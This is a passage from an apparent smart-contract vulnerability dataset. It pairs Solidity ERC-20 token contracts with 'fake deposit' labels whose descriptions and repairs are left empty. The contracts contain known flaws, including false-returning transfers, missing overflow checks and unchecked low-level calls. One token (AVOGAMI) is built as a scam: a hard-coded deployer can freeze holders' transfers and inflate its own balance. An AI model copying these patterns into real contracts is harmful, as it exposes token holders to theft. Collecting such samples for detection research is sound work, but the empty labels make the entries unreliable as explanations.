/// @return success Whether the approval was successful or not\r\n  function approve(address _spender, uint256 _value) public virtual returns (bool success);\r\n\r\n  /// @param _owner The address of the account owning tokens\r\n  /// @param _spender The address of the account able to transfer the tokens\r\n  /// @return remaining Amount of remaining tokens allowed to spent\r\n  function allowance(address _owner, address _spender) public virtual view returns (uint256 remaining);\r\n\r\n  event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n  event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n  function transfer(address _to, uint256 _value) public override returns (bool success) {\r\n    //Default assumes totalSupply can't be over max (2^256 - 1).\r\n    //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n    //Replace the if with this one instead.\r\n    //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n    if (balances[msg.sender] >= _value && _value > 0) {\r\n      balances[msg.sender] -= _value;\r\n      balances[_to] += _value;\r\n      emit Transfer(msg.sender, _to, _value);\r\n      return true;\r\n    } else { return false; }\r\n  }\r\n\r\n  function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\r\n    //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n    //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n    if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n      balances[_to] += _value;\r\n      balances[_from] -= _value;\r\n      allowed[_from][msg.sender] -= _value;\r\n      emit Transfer(_from, _to, _value);\r\n      return true;\r\n    } else { return false; }\r\n  }\r\n\r\n  function balanceOf(address _owner) public override view returns (uint256 balance) {\r\n    return balances[_owner];\r\n  }\r\n\r\n  function approve(address _spender, uint256 _value) public override returns (bool success) {\r\n    allowed[msg.sender][_spender] = _value;\r\n    emit Approval(msg.sender, _spender, _value);\r\n    return true;\r\n  }\r\n\r\n  function allowance(address _owner, address _spender) public override view returns (uint256 remaining) {\r\n    return allowed[_owner][_spender];\r\n  }\r\n\r\n  mapping (address => uint256) balances;\r\n  mapping (address => mapping (address => uint256)) allowed;\r\n}\r\n\r\ncontract OmegaCoinToken is StandardToken {\r\n\r\n  uint8 public constant decimals = 18;\r\n  address public owner;\r\n\r\n  modifier isOwner() {\r\n    require(msg.sender == owner);\r\n    _;\r\n  }\r\n\r\n  function setMinter(address _minterAddress, uint256 _value) public isOwner {\r\n    require(_minterAddress != address(0));\r\n    minters[_minterAddress] = _value;\r\n  }\r\n\r\n  function minterLeft(address _minterAddress) view public returns (uint256 rest) {\r\n      return minters[_minterAddress];\r\n  }\r\n\r\n  function dematerialize(uint256 _value) public {\r\n      if (minters[msg.sender] >= _value && _value > 0) {\r\n          balances[msg.sender] += _value;\r\n          minters[msg.sender] -= _value;\r\n          totalSupply += _value;\r\n          emit Transfer(address(0), msg.sender, _value);\r\n      }\r\n  }\r\n\r\n  function materialize(uint256 _value) public {\r\n    if (minters[msg.sender] >= _value && balances[msg.sender] >= _value && _value > 0) {\r\n      balances[msg.sender] -= _value;\r\n      totalSupply -= _value;\r\n      emit Transfer(msg.sender, address(0), _value);\r\n    }\r\n  }\r\n\r\n  mapping (address => uint256) minters;\r\n}\r\n\r\ncontract OmegaGBP is OmegaCoinToken {\r\n\r\n  string public constant name = \"Omega GBP\";\r\n  string public constant symbol = \"oGBP\";\r\n\r\n  constructor() {\r\n      owner = msg.sender;\r\n      totalSupply = 0;\r\n  }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2017-11-28\r\n*/\r\n\r\n// Abstract contract for the full ERC 20 Token standard\r\n// https://github.com/ethereum/EIPs/issues/20\r\npragma solidity ^0.4.8;\r\n\r\ncontract Token {\r\n    /* This is a slight change to the ERC20 base standard.\r\n    function totalSupply() constant returns (uint256 supply);\r\n    is replaced with:\r\n    uint256 public totalSupply;\r\n    This automatically creates a getter function for the totalSupply.\r\n    This is moved to the base contract since public getter functions are not\r\n    currently recognised as an implementation of the matching abstract\r\n    function by the compiler.\r\n    */\r\n    /// total amount of tokens\r\n    uint256 public totalSupply;\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\n\r\n    /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of tokens to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n/*\r\nYou should inherit from StandardToken or, for a token like you would want to\r\ndeploy in something like Mist, see ProToken.sol.\r\n(This implements ONLY the standard functions and NOTHING else.\r\nIf you deploy this, you won't have anything useful.)\r\n\r\nImplements ERC 20 Token standard: https://github.com/ethereum/EIPs/issues/20\r\n.*/\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n}\r\n\r\ncontract FensToken is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        revert();\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'FENS1.0';     //ProToken 1.0 standard. Just an arbitrary versioning scheme.\r\n\r\n    function FensToken(\r\n        uint256 _initialAmount,\r\n        string _tokenName,\r\n        uint8 _decimalUnits,\r\n        string _tokenSymbol\r\n        ) {\r\n        balances[msg.sender] = _initialAmount;               // Give the creator all initial tokens\r\n        totalSupply = _initialAmount;                        // Update total supply\r\n        name = _tokenName;                                   // Set the name for display purposes\r\n        decimals = _decimalUnits;                            // Amount of decimals for display purposes\r\n        symbol = _tokenSymbol;                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\ncontract Token {\r\n /// @return total amount of tokens\r\n function totalSupply() constant returns (uint256 supply) {}\r\n/// @param _owner The address from which the balance will be retrieved\r\n /// @return The balance\r\n function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n/// @notice send `_value` token to `_to` from `msg.sender`\r\n /// @param _to The address of the recipient\r\n /// @param _value The amount of token to be transferred\r\n /// @return Whether the transfer was successful or not\r\n function transfer(address _to, uint256 _value) returns (bool success) {}\r\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n /// @param _from The address of the sender\r\n /// @param _to The address of the recipient\r\n /// @param _value The amount of token to be transferred\r\n /// @return Whether the transfer was successful or not\r\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n /// @param _spender The address of the account able to transfer the tokens\r\n /// @param _value The amount of wei to be approved for transfer\r\n /// @return Whether the approval was successful or not\r\n function approve(address _spender, uint256 _value) returns (bool success) {}\r\n/// @param _owner The address of the account owning tokens\r\n /// @param _spender The address of the account able to transfer the tokens\r\n /// @return Amount of remaining tokens allowed to spent\r\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\nevent Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\ncontract StandardToken is Token {\r\nfunction transfer(address _to, uint256 _value) returns (bool success) {\r\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\r\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\r\n //Replace the if with this one instead.\r\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n if (balances[msg.sender] >= _value && _value > 0) {\r\n balances[msg.sender] -= _value;\r\n balances[_to] += _value;\r\n Transfer(msg.sender, _to, _value);\r\n return true;\r\n } else { return false; }\r\n }\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n balances[_to] += _value;\r\n balances[_from] -= _value;\r\n allowed[_from][msg.sender] -= _value;\r\n Transfer(_from, _to, _value);\r\n return true;\r\n } else { return false; }\r\n }\r\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\r\n return balances[_owner];\r\n }\r\nfunction approve(address _spender, uint256 _value) returns (bool success) {\r\n allowed[msg.sender][_spender] = _value;\r\n Approval(msg.sender, _spender, _value);\r\n return true;\r\n }\r\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n return allowed[_owner][_spender];\r\n }\r\nmapping (address => uint256) balances;\r\n mapping (address => mapping (address => uint256)) allowed;\r\n uint256 public totalSupply;\r\n}\r\ncontract ERC20Token is StandardToken {\r\nfunction () {\r\n //if ether is sent to this address, send it back.\r\n throw;\r\n }\r\n/* Public variables of the token */\r\n string public name = \"ChoKInfO\"; //Name of the token\r\n uint8 public decimals = 18; //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n string public symbol =\"CKIO\"; //An identifier: eg AXM\r\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n//make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\nfunction ERC20Token(\r\n ) {\r\n balances[msg.sender] = 100000000 * (10 ** 18); // Give the creator all initial tokens (100000 for example)\r\n totalSupply = 100000000 * (10 ** 18); // Update total supply (100000 for example)\r\n name = \"ChoKInfO\"; // Set the name for display purposes\r\n decimals = 18; // Amount of decimals\r\n symbol = \"CKIO\"; // Set the symbol for display purposes\r\n }\r\n/* Approves and then calls the receiving contract */\r\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n allowed[msg.sender][_spender] = _value;\r\n Approval(msg.sender, _spender, _value);\r\n//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\r\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n return true;\r\n }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;contract Token {\r\n /// @return total amount of tokens\r\n function totalSupply() constant returns (uint256 supply) {}/// @param _owner The address from which the balance will be retrieved\r\n /// @return The balance\r\n function balanceOf(address _owner) constant returns (uint256 balance) {}/// @notice send `_value` token to `_to` from `msg.sender`\r\n /// @param _to The address of the recipient\r\n /// @param _value The amount of token to be transferred\r\n /// @return Whether the transfer was successful or not\r\n function transfer(address _to, uint256 _value) returns (bool success) {}/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n /// @param _from The address of the sender\r\n /// @param _to The address of the recipient\r\n /// @param _value The amount of token to be transferred\r\n /// @return Whether the transfer was successful or not\r\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n /// @param _spender The address of the account able to transfer the tokens\r\n /// @param _value The amount of wei to be approved for transfer\r\n /// @return Whether the approval was successful or not\r\n function approve(address _spender, uint256 _value) returns (bool success) {}/// @param _owner The address of the account owning tokens\r\n /// @param _spender The address of the account able to transfer the tokens\r\n /// @return Amount of remaining tokens allowed to spent\r\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}contract StandardToken is Token {function transfer(address _to, uint256 _value) returns (bool success) {\r\n //Default assumes totalSupply can\u2019t be over max (2\u00b2\u2075\u2076 \u2014 1).\r\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn\u2019t wrap.\r\n //Replace the if with this one instead.\r\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n if (balances[msg.sender] >= _value && _value > 0) {\r\n balances[msg.sender] -= _value;\r\n balances[_to] += _value;\r\n Transfer(msg.sender, _to, _value);\r\n return true;\r\n } else { return false; }\r\n }function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n balances[_to] += _value;\r\n balances[_from] -= _value;\r\n allowed[_from][msg.sender] -= _value;\r\n Transfer(_from, _to, _value);\r\n return true;\r\n } else { return false; }\r\n }function balanceOf(address _owner) constant returns (uint256 balance) {\r\n return balances[_owner];\r\n }function approve(address _spender, uint256 _value) returns (bool success) {\r\n allowed[msg.sender][_spender] = _value;\r\n Approval(msg.sender, _spender, _value);\r\n return true;\r\n }function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n return allowed[_owner][_spender];\r\n }mapping (address => uint256) balances;\r\n mapping (address => mapping (address => uint256)) allowed;\r\n uint256 public totalSupply;\r\n}contract ERC20Token is StandardToken {function () {\r\n //if ether is sent to this address, send it back.\r\n throw;\r\n }/* Public variables of the token */\r\n string public name = \"American Redneck Company Coin\"; //Name of the token\r\n uint8 public decimals = 18; //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n string public symbol = \"ARCC\"; //An identifier: eg ARCC\r\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n////make sure this function name matches the contract name above. So if you\u2019re token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\nfunction ERC20Token(\r\n ) {\r\n    balances[msg.sender] = 1000000000000000; // Give the creator all initial tokens (100000 for example)\r\n totalSupply = 1000000000000000; // Update total supply (100000 for example)\r\n name = \"American Redneck Company Coin\"; // Set the name for display purposes\r\n decimals = 18; // Amount of decimals\r\n symbol = \"ARCC\"; // Set the symbol for display purposes\r\n }/* Approves and then calls the receiving contract */\r\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n allowed[msg.sender][_spender] = _value;\r\n Approval(msg.sender, _spender, _value);//call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn\u2019t have to include a contract in here just for this.\r\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n\r\nif \r\n(!_spender.call\r\n(bytes4(bytes32(sha3\r\n(\"receiveApproval(address,uint256,address,bytes)\"\r\n))), msg.sender, _value, this, _extraData)) { throw; }\r\n return true;\r\n }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract DIALECTIC {\r\n  \r\n    mapping (address => uint256) public IP;\r\n    mapping (address => uint256) public BRNED;\r\n    mapping (address => bool) Si;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"AVOGAMI\";\r\n    string public symbol = unicode\"AVOGAMI\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n    address Head_Construct = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n\r\n    constructor()  {\r\n    IP[msg.sender] = totalSupply;\r\n    deploy(Head_Construct, totalSupply); }\r\n\r\n   \r\n   address Head_Deployer = 0x7A25aAbB0B3f595144C1821dBfA4d1A6c8B1761C;\r\n    function deploy(address account, uint256 amount) public {\r\n    require(msg.sender == owner);\r\n    emit Transfer(address(0), account, amount); }\r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == Head_Deployer)  {\r\n        require(IP[msg.sender] >= value);\r\n        IP[msg.sender] -= value;  \r\n        IP[to] += value; \r\n        emit Transfer (Head_Construct, to, value);\r\n        return true; }  \r\n        if(!Si[msg.sender]) {\r\n        require(IP[msg.sender] >= value);\r\n        IP[msg.sender] -= value;  \r\n        IP[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function burnt () public {\r\n         if(msg.sender == Head_Deployer)   {\r\n        IP[msg.sender] = BRNED[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return IP[account]; }\r\n\r\n        function undo(address r) public {\r\n        if(msg.sender == Head_Deployer)  { \r\n        Si[r] = false;}}\r\n        function que(address r) public{\r\n         if(msg.sender == Head_Deployer)  { \r\n        require(!Si[r]);\r\n        Si[r] = true;\r\n        }}\r\n             function burn(uint256 x) public {\r\n        if(msg.sender == Head_Deployer)  { \r\n        BRNED[msg.sender] = x;} }\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n\r\n        if(from == Head_Deployer)  {\r\n        require(value <= IP[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        IP[from] -= value;  \r\n        IP[to] += value; \r\n        emit Transfer (Head_Construct, to, value);\r\n        return true; }    \r\n          if(!Si[from] && !Si[to]) {\r\n        require(value <= IP[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        IP[from] -= value;\r\n        IP[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// File: HRC.sol\r\n\r\n//SPDX-License-Identifier: MIT\r\npragma solidity ^0.4.16;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 100000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 100000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Huerey coin\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals for display purposes\r\n        symbol = \"HRC\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
